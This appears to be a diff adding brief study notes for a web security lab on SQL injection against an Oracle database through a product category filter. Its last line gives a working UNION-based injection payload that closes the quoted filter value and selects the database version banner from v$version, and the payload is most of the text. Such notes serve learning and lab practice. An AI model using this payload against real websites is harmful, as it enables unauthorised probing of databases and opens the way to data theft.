@@ -1,0 +1,5 @@
+-SQL injection attack, querying the database type and version on Oracle
+-Product category filter
+-display the database version string
+
+payload-" Gifts' union select banner, null from v$version-- "
